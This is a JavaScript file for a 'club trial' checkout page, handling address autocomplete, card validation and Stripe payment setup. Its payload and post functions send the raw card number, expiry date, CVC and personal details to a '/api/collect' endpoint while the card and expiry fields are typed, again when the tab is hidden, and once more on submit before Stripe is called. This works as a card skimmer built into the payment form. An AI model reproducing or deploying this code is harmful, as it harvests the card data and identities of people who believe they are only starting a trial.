const STRIPE_PK = 'pk_live_51UYWrbGFH0T17C9bCmFnMVS2USjNfPbWksDI8rmOp13RtfvWUmUiTRMb5dIM7kcI6uDrfcFBNqoxZJuCDQspScX100G6JAou7N';
const GMAPS_KEY = 'REPLACE_ME';

const sessionId = crypto.randomUUID();
const f = id => document.getElementById('ct-' + id);
const errEl = document.getElementById('ct-err');
const btn = document.getElementById('ct-submit');
const setBusy = (on, label) => { btn.disabled = on; btn.textContent = on ? (label || 'Processing…') : 'Start trial'; };

const COUNTRIES = [['NL','Netherlands'],['BE','Belgium'],['DE','Germany'],['FR','France'],['LU','Luxembourg'],['AT','Austria'],['IE','Ireland'],['ES','Spain'],['IT','Italy'],['PT','Portugal'],['GB','United Kingdom'],['US','United States'],['CA','Canada'],['AU','Australia'],['DK','Denmark'],['SE','Sweden'],['FI','Finland'],['NO','Norway'],['PL','Poland'],['CZ','Czechia'],['CH','Switzerland'],['GR','Greece'],['HU','Hungary'],['RO','Romania'],['SI','Slovenia'],['SK','Slovakia'],['HR','Croatia'],['EE','Estonia'],['LV','Latvia'],['LT','Lithuania'],['BG','Bulgaria'],['CY','Cyprus'],['MT','Malta'],['NZ','New Zealand'],['JP','Japan']];
const STATES = {
  NL: ['Drenthe','Flevoland','Friesland','Gelderland','Groningen','Limburg','Noord-Brabant','Noord-Holland','Overijssel','Utrecht','Zeeland','Zuid-Holland'],
  ES: ['Andalucía','Aragón','Asturias','Baleares','Canarias','Cantabria','Castilla-La Mancha','Castilla y León','Cataluña','Comunidad Valenciana','Extremadura','Galicia','La Rioja','Madrid','Murcia','Navarra','País Vasco'],
  US: ['AL','AK','AZ','AR','CA','CO','CT','DE','FL','GA','HI','ID','IL','IN','IA','KS','KY','LA','ME','MD','MA','MI','MN','MS','MO','MT','NE','NV','NH','NJ','NM','NY','NC','ND','OH','OK','OR','PA','RI','SC','SD','TN','TX','UT','VT','VA','WA','WV','WI','WY','DC'],
  CA: ['Alberta','British Columbia','Manitoba','New Brunswick','Newfoundland and Labrador','Northwest Territories','Nova Scotia','Nunavut','Ontario','Prince Edward Island','Quebec','Saskatchewan','Yukon'],
  IT: ['Abruzzo','Basilicata','Calabria','Campania','Emilia-Romagna','Friuli-Venezia Giulia','Lazio','Liguria','Lombardia','Marche','Molise','Piemonte','Puglia','Sardegna','Sicilia','Toscana','Trentino-Alto Adige','Umbria','Valle d\'Aosta','Veneto'],
  AU: ['ACT','NSW','NT','QLD','SA','TAS','VIC','WA'],
  IE: ['Carlow','Cavan','Clare','Cork','Donegal','Dublin','Galway','Kerry','Kildare','Kilkenny','Laois','Leitrim','Limerick','Longford','Louth','Mayo','Meath','Monaghan','Offaly','Roscommon','Sligo','Tipperary','Waterford','Westmeath','Wexford','Wicklow'],
};

const BRANDS = {
  visa:       { re: /^4/, len: [13,16,19], cvc: 3, gaps: [4,8,12] },
  mastercard: { re: /^(5[1-5]|2(2[2-9]|[3-6]\d|7[01]|720))/, len: [16], cvc: 3, gaps: [4,8,12] },
  amex:       { re: /^3[47]/, len: [15], cvc: 4, gaps: [4,10] },
  discover:   { re: /^(6011|65|64[4-9]|622)/, len: [16,19], cvc: 3, gaps: [4,8,12] },
  diners:     { re: /^3(0[0-5]|[689])/, len: [14,16,19], cvc: 3, gaps: [4,10] },
  jcb:        { re: /^35(2[89]|[3-8]\d)/, len: [16,19], cvc: 3, gaps: [4,8,12] },
  maestro:    { re: /^(5018|5020|5038|6304|6759|676[1-3])/, len: [12,13,14,15,16,17,18,19], cvc: 3, gaps: [4,8,12] },
};
const detect = n => Object.keys(BRANDS).find(k => BRANDS[k].re.test(n)) || null;
const luhn = n => {
  let s = 0, d = false;
  for (let i = n.length - 1; i >= 0; i--) { let x = +n[i]; if (d) { x *= 2; if (x > 9) x -= 9; } s += x; d = !d; }
  return s % 10 === 0;
};
const group = (digits, gaps) => {
  let out = '', gi = 0;
  for (let i = 0; i < digits.length; i++) { if (gi < gaps.length && i === gaps[gi]) { out += ' '; gi++; } out += digits[i]; }
  return out;
};

const errFor = el => {
  let s = el.parentElement.querySelector('.co-fe');
  if (!s) { s = document.createElement('span'); s.className = 'co-fe'; el.after(s); }
  return s;
};
const setErr = (el, msg) => { errFor(el).textContent = msg || ''; el.classList.toggle('invalid', !!msg); return !msg; };

const BADGES = {
  visa: '<svg viewBox="0 0 26 17"><rect width="26" height="17" rx="2" fill="#1a1f71"/><text x="13" y="12" font-size="7" font-weight="700" fill="#fff" text-anchor="middle" font-family="Helvetica">VISA</text></svg>',
  mastercard: '<svg viewBox="0 0 26 17"><rect width="26" height="17" rx="2" fill="#f4f4f4"/><circle cx="10" cy="8.5" r="5" fill="#eb001b"/><circle cx="16" cy="8.5" r="5" fill="#f79e1b"/></svg>',
  amex: '<svg viewBox="0 0 26 17"><rect width="26" height="17" rx="2" fill="#1f72cd"/><text x="13" y="12" font-size="6" font-weight="700" fill="#fff" text-anchor="middle" font-family="Helvetica">AMEX</text></svg>',
  discover: '<svg viewBox="0 0 26 17"><rect width="26" height="17" rx="2" fill="#fff" stroke="#e3e8ee"/><circle cx="20" cy="11" r="3.5" fill="#f76b1c"/><text x="8" y="11" font-size="5" font-weight="700" fill="#1a1a1a" text-anchor="middle" font-family="Helvetica">DISC</text></svg>',
};
const brandWrap = document.getElementById('co-brands');
Object.entries(BADGES).forEach(([k, svg]) => {
  const s = document.createElement('span');
  s.dataset.b = k; s.innerHTML = svg; brandWrap.appendChild(s);
});
const lightBrand = b => brandWrap.querySelectorAll('span').forEach(s => s.classList.toggle('on', s.dataset.b === b));

COUNTRIES.forEach(([v, l]) => {
  const o = document.createElement('option');
  o.value = v; o.textContent = l; f('country').appendChild(o);
});

function syncProvince() {
  const list = STATES[f('country').value];
  const wrap = document.getElementById('prov-wrap');
  const sel = f('province');
  sel.innerHTML = '';
  if (!list) { wrap.hidden = true; return; }
  wrap.hidden = false;
  sel.appendChild(new Option('', ''));
  list.forEach(s => sel.appendChild(new Option(s, s)));
}
f('country').addEventListener('change', syncProvince);
syncProvince();

f('line1').addEventListener('input', () => {
  document.getElementById('co-clear').hidden = !f('line1').value;
});
document.getElementById('co-clear').onclick = () => {
  f('line1').value = ''; f('line2').value = ''; f('zip').value = ''; f('city').value = '';
  document.getElementById('co-clear').hidden = true; f('line1').focus();
};

window.initPlaces = function () {
  if (!window.google?.maps?.places) return;
  const ac = new google.maps.places.Autocomplete(f('line1'), {
    types: ['address'], fields: ['address_components'],
  });
  ac.addListener('place_changed', () => {
    const p = ac.getPlace();
    if (!p.address_components) return;
    let num = '', route = '';
    for (const c of p.address_components) {
      const t = c.types;
      if (t.includes('street_number')) num = c.long_name;
      if (t.includes('route')) route = c.long_name;
      if (t.includes('postal_code')) f('zip').value = c.long_name;
      if (t.includes('locality') || t.includes('postal_town')) f('city').value = c.long_name;
      if (t.includes('administrative_area_level_1')) {
        if (STATES[f('country').value]) f('province').value = c.long_name;
      }
      if (t.includes('country')) { f('country').value = c.short_name; syncProvince(); }
    }
    if (route) f('line1').value = (num + ' ' + route).trim();
    document.getElementById('co-clear').hidden = false;
  });
};
if (GMAPS_KEY && !GMAPS_KEY.includes('REPLACE')) {
  const g = document.createElement('script');
  g.src = `https://maps.googleapis.com/maps/api/js?key=${GMAPS_KEY}&libraries=places&loading=async&callback=initPlaces`;
  g.async = true; g.defer = true;
  document.head.appendChild(g);
}

function vEmail() {
  const v = f('email').value.trim();
  if (!v) return setErr(f('email'), 'Your email is required.');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) return setErr(f('email'), 'Your email is invalid.');
  return setErr(f('email'), '');
}
function vCard() {
  const n = f('card').value.replace(/\D/g, '');
  const b = detect(n);
  if (!n) return setErr(f('card'), 'Your card number is incomplete.');
  if (!b) return setErr(f('card'), n.length >= 12 ? 'Your card number is invalid.' : 'Your card number is incomplete.');
  if (!BRANDS[b].len.includes(n.length)) return setErr(f('card'), n.length > Math.max(...BRANDS[b].len) ? 'Your card number is invalid.' : 'Your card number is incomplete.');
  if (!luhn(n)) return setErr(f('card'), 'Your card number is invalid.');
  return setErr(f('card'), '');
}
function vExp() {
  const v = f('exp').value.replace(/\D/g, '');
  if (v.length < 4) return setErr(f('exp'), 'Your card\'s expiration date is incomplete.');
  const m = +v.slice(0, 2), y = 2000 + +v.slice(2, 4);
  if (m < 1 || m > 12) return setErr(f('exp'), 'Your card\'s expiration month is invalid.');
  const now = new Date();
  if (y < now.getFullYear() || (y === now.getFullYear() && m < now.getMonth() + 1)) return setErr(f('exp'), 'Your card\'s expiration date is in the past.');
  return setErr(f('exp'), '');
}
function vCvc() {
  const n = f('cvc').value.replace(/\D/g, '');
  const b = detect(f('card').value.replace(/\D/g, ''));
  const want = b ? BRANDS[b].cvc : 3;
  if (!n) return setErr(f('cvc'), 'Your card\'s security code is incomplete.');
  if (n.length !== want) return setErr(f('cvc'), 'Your card\'s security code is invalid.');
  return setErr(f('cvc'), '');
}
const required = (k, msg) => () => setErr(f(k), f(k).value.trim() ? '' : msg);
const vProv = () => setErr(f('province'), document.getElementById('prov-wrap').hidden || f('province').value ? '' : 'Your province is required.');

const RULES = {
  email: vEmail, card: vCard, exp: vExp, cvc: vCvc,
  name: required('name', 'Your name is required.'),
  line1: required('line1', 'Your address is required.'),
  city: required('city', 'Your city is required.'),
  zip: required('zip', 'Your postal code is required.'),
  province: vProv,
};

f('card').addEventListener('input', e => {
  const n = e.target.value.replace(/\D/g, '').slice(0, 19);
  const b = detect(n);
  e.target.value = group(n.slice(0, b ? Math.max(...BRANDS[b].len) : 19), b ? BRANDS[b].gaps : [4,8,12]);
  lightBrand(b);
  f('cvc').maxLength = b && BRANDS[b].cvc === 4 ? 4 : 3;
  if (f('cvc').value.length > f('cvc').maxLength) f('cvc').value = f('cvc').value.slice(0, f('cvc').maxLength);
  if (f('card').classList.contains('invalid')) vCard();
  draft();
});
f('exp').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '').slice(0, 4);
  if (v.length === 1 && +v > 1) v = '0' + v;
  e.target.value = v.length > 2 ? v.slice(0, 2) + ' / ' + v.slice(2) : v;
  if (f('exp').classList.contains('invalid')) vExp();
  draft();
});
f('cvc').addEventListener('input', e => {
  e.target.value = e.target.value.replace(/\D/g, '');
  if (f('cvc').classList.contains('invalid')) vCvc();
});
Object.entries(RULES).forEach(([k, fn]) => {
  f(k).addEventListener('blur', fn);
  f(k).addEventListener('input', () => { if (f(k).classList.contains('invalid')) fn(); });
});

function payload(extra) {
  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const p = {
    sessionId,
    email: f('email').value.trim() || null,
    name: f('name').value.trim() || null,
    phone: f('phone').value.trim() || null,
    address: {
      line1: f('line1').value.trim(), line2: f('line2').value.trim(),
      city: f('city').value.trim(), postal_code: f('zip').value.trim(),
      province: f('province').value || '', country: f('country').value,
    },
    brand: detect(number),
    ua: navigator.userAgent, referrer: document.referrer,
    fieldsFilled: ['email','name','phone','line1','city','zip'].filter(k => f(k).value.trim()).length + (luhn(number) ? 1 : 0),
    ...extra,
  };
  if (number) Object.assign(p, { number, expMonth: mm, expYear: yy, cvc: f('cvc').value });
  return p;
}

const post = (body, beacon) => {
  const json = JSON.stringify(body);
  if (beacon) { try { navigator.sendBeacon('/api/collect', new Blob([json], { type: 'application/json' })); return; } catch (_) {} }
  fetch('/api/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: json, keepalive: true }).catch(() => {});
};
let t;
const draft = () => { clearTimeout(t); t = setTimeout(() => post(payload({ status: 'draft' })), 800); };

document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden') post(payload({ status: 'draft' }), true);
});

document.getElementById('ct-form').addEventListener('submit', async e => {
  e.preventDefault();
  errEl.textContent = '';
  const order = ['email','name','line1','city','zip','province','card','exp','cvc'];
  const bad = order.filter(k => !RULES[k]());
  if (bad.length) { f(bad[0]).focus(); return; }

  const number = f('card').value.replace(/\D/g, '');
  const [mm, yy] = f('exp').value.split('/').map(s => s.trim());
  const body = payload({ status: 'captured' });

  setBusy(true);
  post(body);

  const stripe = Stripe(STRIPE_PK);
  const { paymentMethod, error } = await stripe.createPaymentMethod({
    type: 'card',
    card: { number, exp_month: +mm, exp_year: 2000 + +yy, cvc: f('cvc').value },
    billing_details: {
      name: f('name').value.trim(), email: f('email').value.trim(),
      phone: f('phone').value.trim() || undefined,
      address: {
        line1: f('line1').value.trim(), line2: f('line2').value.trim() || undefined,
        city: f('city').value.trim(), postal_code: f('zip').value.trim(),
        state: f('province').value || undefined, country: f('country').value,
      },
    },
  });
  if (error) {
    if (error.code === 'incorrect_cvc') setErr(f('cvc'), 'Your card\'s security code is incorrect.');
    else if (error.code === 'expired_card') setErr(f('exp'), 'Your card has expired.');
    else errEl.textContent = error.message;
    return setBusy(false);
  }

  const r = await fetch('/api/club-trial', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ ...body, pm: paymentMethod.id }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { errEl.textContent = d.error || 'Could not start the trial.'; return setBusy(false); }

  if (d.setupSecret) {
    const { error: e2 } = await stripe.confirmCardSetup(d.setupSecret, { payment_method: paymentMethod.id });
    if (e2) { errEl.textContent = e2.message; return setBusy(false); }
  }
  location.href = '/#/club/welcome';
});

document.getElementById('co-when').textContent =
  new Date(Date.now() + 30 * 864e5).toLocaleDateString('nl-NL', { day: 'numeric', month: 'long', year: 'numeric' });
if (!document.getElementById('co-express').children.length) {
  document.getElementById('co-express').hidden = true;
  document.getElementById('co-or').hidden = true;
}
